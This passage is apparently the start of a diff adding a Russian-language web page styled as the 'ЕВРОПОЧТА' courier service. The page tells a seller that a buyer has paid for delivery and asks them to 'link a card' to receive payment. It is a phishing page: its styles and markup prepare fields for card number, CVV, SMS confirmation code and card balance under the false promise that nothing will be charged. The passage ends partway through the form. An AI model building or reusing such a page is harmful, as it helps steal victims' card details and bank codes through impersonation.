@@ -1,0 +1,1453 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ЕВРОПОЧТА - Доставка курьером</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+
+    <style>
+        :root {
+            --primary: #1e68b9;
+            --primary-dark: #155a9e;
+            --primary-light: #f0f6fc;
+            --success: #2e9e5b;
+            --success-light: #e8f5e9;
+            --error: #e53935;
+            --error-light: #ffebee;
+            --text: #1a1a1a;
+            --text-muted: #6b7280;
+            --border: #e0e4e8;
+            --bg: #f0f2f5;
+            --card-bg: #ffffff;
+            --radius: 12px;
+            --radius-lg: 16px;
+            --shadow-sm: 0 1px 3px rgba(0,0,0,0.06);
+            --shadow-md: 0 4px 12px rgba(0,0,0,0.08);
+            --shadow-lg: 0 10px 30px rgba(0,0,0,0.1);
+            --transition: 0.2s ease;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            font-family: 'Manrope', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: linear-gradient(135deg, #eef1f6 0%, #e4e9f2 100%);
+            color: var(--text);
+            line-height: 1.5;
+            display: flex;
+            justify-content: center;
+            min-height: 100vh;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 480px;
+            background: var(--card-bg);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            box-shadow: var(--shadow-lg);
+            position: relative;
+        }
+
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 18px;
+            border-bottom: 1px solid var(--border);
+            z-index: 10;
+            position: sticky;
+            top: 0;
+            backdrop-filter: blur(8px);
+            background: rgba(255,255,255,0.95);
+        }
+
+        .logo {
+            display: inline-block;
+            background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB3aWR0aD0iMzAwIiBoZWlnaHQ9IjUwIj48aW1hZ2Ugd2lkdGg9IjMwMCIgaGVpZ2h0PSI1MCIgeGxpbms6aHJlZj0iZGF0YTppbWFnZS9zdmcreG1sO2Jhc2U2NCxQRDk0Yld3Z2RtVnljMmx2YmowaU1TNHdJaUJsYm1OdlpHbHVaejBpZFhSbUxUZ2lQejROQ2p3aExTMGdSMlZ1WlhKaGRHOXlPaUJCWkc5aVpTQkpiR3gxYzNSeVlYUnZjaUF5TkM0ekxqQXNJRk5XUnlCRmVIQnZjblFnVUd4MVp5MUpiaUF1SUZOV1J5QldaWEp6YVc5dU9pQTJMakF3SUVKMWFXeGtJREFwSUNBdExUNE5Danh6ZG1jZ2RtVnljMmx2YmowaU1TNHhJaUJwWkQwaTBLSFF1OUMrMExsZk1TSWdlRzFzYm5NOUltaDBkSEE2THk5M2QzY3Vkek11YjNKbkx6SXdNREF2YzNabklpQjRiV3h1Y3pwNGJHbHVhejBpYUhSMGNEb3ZMM2QzZHk1M015NXZjbWN2TVRrNU9TOTRiR2x1YXlJZ2VEMGlNSEI0SWlCNVBTSXdjSGdpRFFvSklIWnBaWGRDYjNnOUlqQWdNQ0F5TURRZ016UWlJSE4wZVd4bFBTSmxibUZpYkdVdFltRmphMmR5YjNWdVpEcHVaWGNnTUNBd0lESXdOQ0F6TkRzaUlIaHRiRHB6Y0dGalpUMGljSEpsYzJWeWRtVWlQZzBLUEhOMGVXeGxJSFI1Y0dVOUluUmxlSFF2WTNOeklqNE5DZ2t1YzNRd2UyWnBiR3c2STBRNU1VTXhPRHQ5RFFvSkxuTjBNWHRtYVd4c09pTXlNVFEwT0RBN2ZRMEtQQzl6ZEhsc1pUNE5DanhuUGcwS0NUeHdiMng1WjI5dUlHTnNZWE56UFNKemREQWlJSEJ2YVc1MGN6MGlNVEF1T0N3eE9DNDVJREl5TGpFc01UZ3VPU0F5TWk0eExERTBMamNnTVRBdU9Dd3hOQzQzSURFd0xqZ3NNVEV1T0NBeU15NDBMREV4TGpnZ01qTXVOQ3czTGpVZ05pNHlMRGN1TlNBMkxqSXNNall1TkNBeU15NDVMREkyTGpRZ0RRb0pDVEl6TGprc01qSXVNU0F4TUM0NExESXlMakVnQ1NJdlBnMEtDVHh3WVhSb0lHTnNZWE56UFNKemREQWlJR1E5SWswek1TNDFMREl5TGpKMkxUTXVOV2c0TGpOak1TNHhMREFzTVM0NExEQXVOeXd4TGpnc01TNDNjeTB3TGpjc01TNDNMVEV1T1N3eExqZE1NekV1TlN3eU1pNHlURE14TGpVc01qSXVNbm9nVFRNNUxqRXNNVFF1Tm1ndE55NDJkaTB5TGpsb055NHpEUW9KQ1dNeExqUXNNQ3d4TGpZc01Td3hMallzTVM0MVF6UXdMalFzTVRNdU9Td3pPUzQ1TERFMExqWXNNemt1TVN3eE5DNDJURE01TGpFc01UUXVObm9nVFRRekxqY3NNVFV1T0dNd0xqZ3RNQzQzTERFdU1pMHhMamdzTVM0eUxUTXVNV013TFRNdU1TMHlMalF0TlM0eUxUVXVPUzAxTGpKSU1qWXVPQTBLQ1FsMk1UZ3VPV2d4TTJNekxqVXNNQ3cyTGpNdE1pNDJMRFl1TXkwMlF6UTJMaklzTVRndU15dzBOUzR6TERFMkxqZ3NORE11Tnl3eE5TNDRURFF6TGpjc01UVXVPSG9pTHo0TkNnazhjR0YwYUNCamJHRnpjejBpYzNRd0lpQmtQU0pOTlRNdU15d3hNUzQ0YURZdU0yTXlMREFzTXk0MExERXVNeXd6TGpRc015NHlZekFzTVM0NUxURXVNeXd6TGpFdE15NDBMRE11TVdndE5pNHpWakV4TGpoTU5UTXVNeXd4TVM0NGVpQk5OVGt1T0N3M0xqVklORGd1TjNZeE9DNDVhRFF1Tm5ZdE5DNHhEUW9KQ1dnMkxqVmpOQzQyTERBc055NDRMVE1zTnk0NExUY3VNME0yTnk0MkxERXdMamNzTmpRdU15dzNMalVzTlRrdU9DdzNMalZNTlRrdU9DdzNMalY2SWk4K0RRb0pQSEJoZEdnZ1kyeGhjM005SW5OME1DSWdaRDBpVFRjNUxqZ3NNakl1T1dNdE15NDFMREF0TlM0NUxUSXVOQzAxTGprdE5TNDVZekF0TXk0MUxESXVOQzAxTGprc05TNDVMVFV1T1hNMUxqa3NNaTQwTERVdU9TdzFMamxET0RVdU9Dd3lNQzQxTERnekxqUXNNakl1T1N3M09TNDRMREl5TGprTkNna0pURGM1TGpnc01qSXVPWG9nVFRjNUxqZ3NOeTR4WXkwMkxEQXRNVEF1Tml3MExqTXRNVEF1Tml3NUxqbHpOQzQxTERrdU9Td3hNQzQyTERrdU9XTTJMREFzTVRBdU5pMDBMak1zTVRBdU5pMDVMamxET1RBdU5Dd3hNUzQwTERnMUxqa3NOeTR4TERjNUxqZ3NOeTR4VERjNUxqZ3NOeTR4ZWlJdlBnMEtDVHh3YjJ4NVoyOXVJR05zWVhOelBTSnpkREVpSUhCdmFXNTBjejBpT1RJdU5Td3lOaTQwSURrM0xqRXNNall1TkNBNU55NHhMREV4TGpjZ01UQTJMalVzTVRFdU55QXhNRFl1TlN3eU5pNDBJREV4TVM0eUxESTJMalFnTVRFeExqSXNOeTQxSURreUxqVXNOeTQxSUFraUx6NE5DZ2s4Y0dGMGFDQmpiR0Z6Y3owaWMzUXhJaUJrUFNKTk1USTBMakVzTWpJdU9XTXRNeTQxTERBdE5TNDVMVEl1TkMwMUxqa3ROUzQ1WXpBdE15NDFMREl1TkMwMUxqa3NOUzQ1TFRVdU9XTXpMalVzTUN3MUxqa3NNaTQwTERVdU9TdzFMamtOQ2drSlF6RXpNQ3d5TUM0MUxERXlOeTQyTERJeUxqa3NNVEkwTGpFc01qSXVPVXd4TWpRdU1Td3lNaTQ1ZWlCTk1USTBMakVzTnk0eFl5MDJMREF0TVRBdU5pdzBMak10TVRBdU5pdzVMamx6TkM0MUxEa3VPU3d4TUM0MkxEa3VPV00yTERBc01UQXVOaTAwTGpNc01UQXVOaTA1TGprTkNna0pRekV6TkM0M0xERXhMalFzTVRNd0xqRXNOeTR4TERFeU5DNHhMRGN1TVV3eE1qUXVNU3czTGpGNklpOCtEUW9KUEhCaGRHZ2dZMnhoYzNNOUluTjBNU0lnWkQwaVRURTFNQzQwTERFNExqSm9MVFV1TjJNdE1pNHpMREF0TXk0MUxURXVNaTB6TGpVdE15NDJWamN1TldndE5DNDJWakUxWXpBc05DNDFMRE1zTnk0MUxEY3VOU3czTGpWb05pNHpkalJvTkM0MlZqY3VOV2d0TkM0MlRERTFNQzQwTERFNExqSU5DZ2tKVERFMU1DNDBMREU0TGpKNklpOCtEUW9KUEhCdmJIbG5iMjRnWTJ4aGMzTTlJbk4wTVNJZ2NHOXBiblJ6UFNJeE56WXVOeXczTGpVZ01UVTNMakVzTnk0MUlERTFOeTR4TERFeExqY2dNVFkwTGpZc01URXVOeUF4TmpRdU5pd3lOaTQwSURFMk9TNHlMREkyTGpRZ01UWTVMaklzTVRFdU55QXhOell1Tnl3eE1TNDNJQWtpTHo0TkNnazhjR0YwYUNCamJHRnpjejBpYzNReElpQmtQU0pOTVRneUxqUXNNVGt1Tld3ekxqSXROeTQ0YURFdU1Xd3pMakVzTnk0NFNERTRNaTQwVERFNE1pNDBMREU1TGpWNklFMHhPRGt1T0N3M0xqVm9MVGN1TVd3dE9DNHlMREU0TGpsb05Xd3hMakl0TWk0NGFERXhMakZzTVM0eUxESXVPR2cwTGprTkNna0pUREU0T1M0NExEY3VOVXd4T0RrdU9DdzNMalY2SWk4K0RRbzhMMmMrRFFvOEwzTjJaejROQ2c9PSIgLz48L3N2Zz4=");
+            background-repeat: no-repeat;
+            background-size: contain;
+            width: 130px;
+            height: 26px;
+            text-indent: -1000em;
+            overflow: hidden;
+        }
+
+        .header-icons {
+            display: flex;
+            gap: 16px;
+            color: var(--text-muted);
+        }
+
+        .header-icons svg {
+            width: 22px;
+            height: 22px;
+            fill: none;
+            stroke: currentColor;
+            stroke-width: 2;
+            cursor: pointer;
+            transition: color var(--transition);
+        }
+        .header-icons svg:hover { color: var(--primary); }
+
+        .main-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+
+        .slide {
+            display: none;
+            padding: 24px 18px;
+            animation: fadeIn 0.35s ease-in-out;
+        }
+
+        .slide.active { display: block; }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(12px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .delivery-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: linear-gradient(135deg, #e8f2fd, #dbeafe);
+            color: var(--primary);
+            font-size: 12px;
+            font-weight: 800;
+            padding: 6px 12px;
+            border-radius: 20px;
+            margin-bottom: 14px;
+            letter-spacing: 0.3px;
+        }
+        .delivery-badge svg { width: 14px; height: 14px; stroke: currentColor; stroke-width: 2.2; fill: none; }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 800;
+            margin-bottom: 20px;
+            color: var(--text);
+            line-height: 1.25;
+            letter-spacing: -0.5px;
+        }
+
+        .tabs {
+            display: flex;
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            overflow: hidden;
+            margin-bottom: 24px;
+            background: #f8f9fb;
+            padding: 4px;
+            gap: 4px;
+        }
+
+        .tab {
+            flex: 1;
+            padding: 10px 12px;
+            text-align: center;
+            font-size: 13.5px;
+            font-weight: 700;
+            cursor: pointer;
+            background: transparent;
+            color: var(--text-muted);
+            border: none;
+            border-radius: 8px;
+            transition: all var(--transition);
+            font-family: inherit;
+        }
+
+        .tab.active {
+            background: var(--primary);
+            color: #fff;
+            box-shadow: 0 2px 8px rgba(30,104,185,0.3);
+        }
+
+        .steps {
+            display: flex;
+            flex-direction: column;
+            gap: 18px;
+        }
+
+        .step {
+            display: flex;
+            gap: 14px;
+            align-items: flex-start;
+        }
+
+        .icon-box {
+            width: 38px;
+            height: 38px;
+            flex-shrink: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: var(--primary-light);
+            border-radius: 50%;
+            color: var(--primary);
+            transition: transform var(--transition);
+        }
+        .step:hover .icon-box { transform: scale(1.08); }
+
+        .icon-box svg {
+            width: 19px;
+            height: 19px;
+            stroke: currentColor;
+            stroke-width: 2;
+            fill: none;
+        }
+
+        .step-text {
+            font-size: 14.5px;
+            color: var(--text);
+            padding-top: 6px;
+            font-weight: 500;
+            line-height: 1.45;
+        }
+
+        .form-header { margin-bottom: 22px; }
+        .form-header h1 { margin-bottom: 6px; }
+
+        .subtitle {
+            font-size: 14px;
+            color: var(--text-muted);
+            font-weight: 500;
+            line-height: 1.45;
+        }
+
+        .form-section {
+            background: #fff;
+            border: 1px solid var(--border);
+            border-radius: var(--radius-lg);
+            padding: 22px;
+            margin-bottom: 18px;
+            box-shadow: var(--shadow-sm);
+            transition: box-shadow var(--transition);
+        }
+        .form-section:focus-within { box-shadow: var(--shadow-md); }
+
+        .form-section-title {
+            font-size: 15px;
+            font-weight: 800;
+            margin-bottom: 18px;
+            color: var(--primary);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            letter-spacing: -0.2px;
+        }
+
+        .form-section-title svg { width: 19px; height: 19px; }
+
+        .form-group {
+            margin-bottom: 18px;
+            position: relative;
+        }
+        .form-group:last-child { margin-bottom: 0; }
+
+        .form-group label {
+            display: block;
+            font-size: 12px;
+            color: var(--text-muted);
+            margin-bottom: 7px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.4px;
+            transition: color var(--transition);
+        }
+        .form-group:focus-within label { color: var(--primary); }
+
+        .input-wrap { position: relative; }
+
+        .form-group input {
+            width: 100%;
+            padding: 14px 42px 14px 14px;
+            border: 1.5px solid var(--border);
+            border-radius: 10px;
+            font-size: 15px;
+            font-family: inherit;
+            background: #fafbfc;
+            transition: all var(--transition);
+            font-weight: 600;
+            color: var(--text);
+        }
+
+        .form-group input::placeholder {
+            font-weight: 400;
+            color: #a8afb8;
+        }
+
+        .form-group input:hover:not(:disabled) { border-color: #c9d1d9; }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: var(--primary);
+            background: #fff;
+            box-shadow: 0 0 0 3px rgba(30, 104, 185, 0.12);
+        }
+
+        .form-group.valid input {
+            border-color: var(--success);
+            background: #f3fbf6;
+        }
+        .form-group.valid input:focus {
+            box-shadow: 0 0 0 3px rgba(46, 158, 91, 0.15);
+        }
+
+        .form-group.error input {
+            border-color: var(--error);
+            background: var(--error-light);
+        }
+        .form-group.error input:focus {
+            box-shadow: 0 0 0 3px rgba(229, 57, 53, 0.12);
+        }
+
+        #cardnumber { padding-right: 100px; }
+
+        .status-icon {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 20px;
+            height: 20px;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 2;
+        }
+        .form-group.valid .status-icon.success { display: flex; }
+        .form-group.error .status-icon.error-icon { display: flex; }
+        .status-icon svg { width: 14px; height: 14px; stroke: #fff; stroke-width: 3; fill: none; }
+        .status-icon.success { background: var(--success); }
+        .status-icon.error-icon { background: var(--error); }
+
+        .card-brand {
+            position: absolute;
+            right: 40px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 10px;
+            font-weight: 800;
+            padding: 3px 7px;
+            border-radius: 4px;
+            background: #eef2f7;
+            color: var(--primary);
+            display: none;
+            letter-spacing: 0.3px;
+            pointer-events: none;
+            z-index: 1;
+        }
+        .card-brand.show { display: block; }
+        .card-brand.visa { background: #1a1f71; color: #fff; }
+        .card-brand.mastercard { background: #eb001b; color: #fff; }
+        .card-brand.mir { background: #0f754e; color: #fff; }
+        .card-brand.maestro { background: #00a2e5; color: #fff; }
+        .card-brand.amex { background: #006fcf; color: #fff; }
+        .card-brand.unionpay { background: #00447c; color: #fff; }
+        .card-brand.discover { background: #f76f20; color: #fff; }
+        .card-brand.jcb { background: #0b4ea2; color: #fff; }
+        .card-brand.diners { background: #0079be; color: #fff; }
+        .card-brand.belkart { background: #00a651; color: #fff; }
+
+        .error-message {
+            display: none;
+            font-size: 11.5px;
+            color: var(--error);
+            margin-top: 6px;
+            font-weight: 700;
+            line-height: 1.3;
+            padding-left: 2px;
+        }
+        .form-group.error .error-message { display: block; animation: slideDown 0.2s ease; }
+
+        @keyframes slideDown {
+            from { opacity: 0; transform: translateY(-3px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-6px); }
+            75% { transform: translateX(6px); }
+        }
+        .shake { animation: shake 0.35s ease-in-out; }
+
+        .form-row {
+            display: flex;
+            gap: 14px;
+        }
+        .form-row .form-group { flex: 1; margin-bottom: 0; }
+
+        .cvv-toggle {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: var(--text-muted);
+            padding: 4px;
+            display: flex;
+            align-items: center;
+            border-radius: 4px;
+            transition: color var(--transition);
+            z-index: 2;
+        }
+        .cvv-toggle:hover { color: var(--primary); }
+        .cvv-toggle svg { width: 18px; height: 18px; stroke: currentColor; stroke-width: 2; fill: none; }
+
+        .btn-primary {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            width: 100%;
+            background: linear-gradient(135deg, var(--primary) 0%, #2a7bd6 100%);
+            color: white;
+            text-align: center;
+            padding: 16px;
+            border-radius: 10px;
+            text-decoration: none;
+            font-weight: 800;
+            font-size: 15.5px;
+            margin-top: 12px;
+            border: none;
+            cursor: pointer;
+            transition: all var(--transition);
+            letter-spacing: 0.2px;
+            font-family: inherit;
+            position: relative;
+            overflow: hidden;
+        }
+        .btn-primary::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(135deg, rgba(255,255,255,0.15), transparent);
+            opacity: 0;
+            transition: opacity var(--transition);
+        }
+        .btn-primary:hover:not(:disabled)::after { opacity: 1; }
+        .btn-primary:hover:not(:disabled) {
+            transform: translateY(-1px);
+            box-shadow: 0 6px 20px rgba(30,104,185,0.35);
+        }
+        .btn-primary:active:not(:disabled) { transform: translateY(0) scale(0.99); }
+        .btn-primary:disabled {
+            background: #c5d3e2;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+        .btn-primary .spinner {
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255,255,255,0.4);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            display: none;
+        }
+        .btn-primary.loading .spinner { display: inline-block; }
+        .btn-primary.loading .btn-label { opacity: 0.8; }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .btn-secondary {
+            display: block;
+            width: 100%;
+            background: transparent;
+            color: var(--primary);
+            text-align: center;
+            padding: 14px;
+            border-radius: 10px;
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 14.5px;
+            margin-top: 14px;
+            border: 1.5px solid var(--border);
+            cursor: pointer;
+            transition: all var(--transition);
+            font-family: inherit;
+        }
+        .btn-secondary:hover {
+            background: var(--primary-light);
+            border-color: var(--primary);
+        }
+
+        .secure-note {
+            font-size: 12px;
+            color: var(--text-muted);
+            text-align: center;
+            margin-top: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            font-weight: 600;
+            line-height: 1.4;
+        }
+        .secure-note svg { color: var(--success); flex-shrink: 0; }
+
+        .card-hint {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-top: 10px;
+            padding: 10px 12px;
+            background: var(--success-light);
+            border-radius: 8px;
+            font-size: 12.5px;
+            color: #1b5e20;
+            font-weight: 600;
+            line-height: 1.4;
+        }
+        .card-hint svg {
+            width: 16px;
+            height: 16px;
+            flex-shrink: 0;
+            stroke: var(--success);
+            stroke-width: 2.5;
+            fill: none;
+        }
+
+        .sms-header {
+            text-align: center;
+            margin-bottom: 28px;
+            margin-top: 16px;
+        }
+        .sms-icon {
+            width: 72px;
+            height: 72px;
+            background: linear-gradient(135deg, var(--primary-light), #e1eefb);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 18px;
+            color: var(--primary);
+            box-shadow: 0 8px 24px rgba(30,104,185,0.18);
+        }
+        .sms-icon svg { width: 34px; height: 34px; stroke: currentColor; stroke-width: 2; fill: none; }
+
+        .sms-header h1 { font-size: 22px; margin-bottom: 8px; text-align: center; }
+        .sms-header p { font-size: 13.5px; color: var(--text-muted); font-weight: 500; line-height: 1.5; }
+        .sms-header p strong { font-weight: 800; color: var(--text); }
+
+        .code-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin: 28px 0;
+        }
+        .code-inputs input {
+            width: 48px;
+            height: 58px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 800;
+            border: 2px solid var(--border);
+            border-radius: 10px;
+            background: #fafbfc;
+            font-family: inherit;
+            transition: all var(--transition);
+            color: var(--text);
+        }
+        .code-inputs input:hover { border-color: #c9d1d9; }
+        .code-inputs input:focus {
+            outline: none;
+            border-color: var(--primary);
+            background: #fff;
+            box-shadow: 0 0 0 3px rgba(30, 104, 185, 0.15);
+            transform: translateY(-2px);
+        }
+        .code-inputs input.filled {
+            border-color: var(--primary);
+            background: var(--primary-light);
+        }
+        .code-inputs.error input {
+            border-color: var(--error);
+            background: var(--error-light);
+        }
+        .code-inputs.error { animation: shake 0.35s ease-in-out; }
+
+        .code-error {
+            text-align: center;
+            color: var(--error);
+            font-size: 13px;
+            font-weight: 700;
+            margin-bottom: 15px;
+            display: none;
+        }
+        .code-error.show { display: block; animation: slideDown 0.2s ease; }
+
+        .resend-block {
+            text-align: center;
+            margin-top: 22px;
+            font-size: 13.5px;
+            color: var(--text-muted);
+            font-weight: 500;
+        }
+        .resend-block button {
+            background: none;
+            border: none;
+            color: var(--primary);
+            font-weight: 800;
+            cursor: pointer;
+            font-size: 13.5px;
+            font-family: inherit;
+            padding: 0;
+            margin-left: 4px;
+            transition: color var(--transition);
+        }
+        .resend-block button:disabled { color: #b8c0c9; cursor: not-allowed; }
+        .resend-block button:not(:disabled):hover { text-decoration: underline; }
+
+        footer {
+            background: #f8f9fb;
+            border-top: 1px solid var(--border);
+            padding: 20px 18px;
+            font-size: 14px;
+            margin-top: auto;
+        }
+        .menu-footer {
+            list-style: none;
+            padding: 0;
+            margin: 0 0 20px 0;
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+        @media (min-width: 600px) {
+            .menu-footer { flex-direction: row; justify-content: space-between; }
+            .menu-footer > li { width: 33.333%; }
+        }
+        .menu-footer > li .title {
+            font-weight: 800;
+            color: var(--text);
+            padding-bottom: 10px;
+            font-size: 14px;
+        }
+        .menu-footer > li ul { list-style: none; padding: 0; margin: 0; }
+        .menu-footer > li li a {
+            color: var(--text-muted);
+            text-decoration: none;
+            display: inline-block;
+            padding: 4px 0;
+            transition: color var(--transition);
+            font-size: 13px;
+            font-weight: 500;
+        }
+        .menu-footer > li li a:hover { color: var(--primary); text-decoration: underline; }
+
+        .footer-licence {
+            font-size: 11px;
+            color: #8a929b;
+            line-height: 1.5;
+            padding-top: 15px;
+            border-top: 1px solid var(--border);
+            font-weight: 500;
+        }
+        .footer-licence p { margin-bottom: 8px; }
+        .footer-licence a { color: var(--primary); text-decoration: none; font-weight: 700; }
+        .footer-licence a:hover { text-decoration: underline; }
+
+        @media (max-width: 380px) {
+            .slide { padding: 20px 14px; }
+            h1 { font-size: 21px; }
+            .form-section { padding: 18px; }
+            .code-inputs { gap: 6px; }
+            .code-inputs input { width: 42px; height: 54px; font-size: 22px; }
+            .form-row { gap: 10px; }
+            #cardnumber { padding-right: 88px; }
+            .card-brand { right: 36px; font-size: 9px; padding: 2px 5px; }
+            .status-icon { right: 8px; width: 18px; height: 18px; }
+            .status-icon svg { width: 12px; height: 12px; }
+        }
+
+        .btn-primary.loading .btn-label { visibility: hidden; }
+        .btn-primary.loading .spinner {
+            display: inline-block;
+            position: absolute;
+        }
+
+        #balance { padding-right: 42px; }
+
+        /* --- Стили для инфо-блока на слайде баланса --- */
+        .balance-info-box {
+            background: #f4f8fd;
+            border: 1px solid #d0e3f5;
+            border-radius: var(--radius-lg);
+            padding: 20px;
+            margin-bottom: 24px;
+            text-align: left;
+        }
+        .balance-info-title {
+            font-weight: 800;
+            color: var(--primary);
+            font-size: 15px;
+            margin-bottom: 8px;
+        }
+        .balance-info-text {
+            font-size: 13.5px;
+            color: var(--text);
+            line-height: 1.6;
+            margin-bottom: 16px;
+        }
+        .balance-time-box {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            background: #fff;
+            border-radius: var(--radius);
+            padding: 12px 16px;
+            border: 1px solid var(--border);
+            box-shadow: var(--shadow-sm);
+        }
+        .balance-time-box svg {
+            width: 20px;
+            height: 20px;
+            flex-shrink: 0;
+            stroke: var(--primary);
+            fill: none;
+            stroke-width: 2.5;
+            margin-top: 2px;
+        }
+        .balance-time-text {
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--text-muted);
+            line-height: 1.4;
+        }
+        .balance-time-text strong {
+            color: var(--text);
+            font-weight: 800;
+            font-size: 14px;
+            display: block;
+            margin-bottom: 2px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <header>
+            <a href="#" class="logo" title="На главную" onclick="showSlide('slide-info'); return false;"></a>
+            <div class="header-icons">
+                <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+                <svg viewBox="0 0 24 24"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg>
+            </div>
+        </header>
+
+        <div class="main-content">
+
+            <!-- СЛАЙД 1: Информация о доставке -->
+            <div id="slide-info" class="slide active">
+                <div class="delivery-badge">
+                    <svg viewBox="0 0 24 24"><rect x="1" y="3" width="15" height="13"></rect><polygon points="16 8 20 8 23 11 23 16 16 16 16 8"></polygon><circle cx="5.5" cy="18.5" r="2.5"></circle><circle cx="18.5" cy="18.5" r="2.5"></circle></svg>
+                    Доставка курьером
+                </div>
+                <h1>Как это работает?</h1>
+                <div class="tabs">
+                    <button class="tab" onclick="switchTab(this, 'tab-feedback')">Обратная связь</button>
+                    <button class="tab active" onclick="switchTab(this, 'tab-faq')">Вопрос-ответ</button>
+                </div>
+                <div id="tab-faq" class="tab-content" style="display: block;">
+                    <div class="steps">
+                        <div class="step">
+                            <div class="icon-box"><svg viewBox="0 0 24 24"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"></path><polyline points="3.27 6.96 12 12.01 20.73 6.96"></polyline><line x1="12" y1="22.08" x2="12" y2="12"></line></svg></div>
+                            <div class="step-text">1. Покупатель оформляет заказ и оплачивает доставку курьером.</div>
+                        </div>
+                        <div class="step">
+                            <div class="icon-box"><svg viewBox="0 0 24 24"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg></div>
+                            <div class="step-text">2. Привяжите карту, на которую курьер перечислит средства после доставки.</div>
+                        </div>
+                        <div class="step">
+                            <div class="icon-box"><svg viewBox="0 0 24 24"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg></div>
+                            <div class="step-text">3. Укажите адрес доставки — курьер приедет по этому адресу.</div>
+                        </div>
+                        <div class="step">
+                            <div class="icon-box"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg></div>
+                            <div class="step-text">4. Подтвердите привязку карты кодом из СМС — данные защищены.</div>
+                        </div>
+                        <div class="step">
+                            <div class="icon-box"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline><path d="M16 3l4 4"></path></svg></div>
+                            <div class="step-text">5. Ожидайте звонка курьера в течение 12 часов для согласования времени.</div>
+                        </div>
+                    </div>
+                </div>
+                <div id="tab-feedback" class="tab-content" style="display: none;">
+                    <p style="color: var(--text-muted); font-size: 14.5px; text-align: center; padding: 30px 0; font-weight: 500;">
+                        Здесь будет форма обратной связи. <br><br>
+                        Позвоните нам: <strong style="font-weight: 800;">5353636</strong>
+                    </p>
+                </div>
+                <button class="btn-primary" onclick="showSlide('slide-form')" style="margin-top: 28px;">
+                    <span class="btn-label">Подтвердить оформление заказа</span>
+                </button>
+            </div>
+
+            <!-- СЛАЙД 2: Привязка карты -->
+            <div id="slide-form" class="slide">
+                <div class="form-header">
+                    <h1>Привязка карты</h1>
+                    <p class="subtitle">Привяжите карту, чтобы получить средства за доставленный заказ. Списание с карты не производится.</p>
+                </div>
+
+                <form id="payout-form" novalidate autocomplete="off">
+
+                    <div class="form-section">
+                        <div class="form-section-title">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg>
+                            Адрес доставки
+                        </div>
+                        <div class="form-group">
+                            <label for="fullname">ФИО получателя</label>
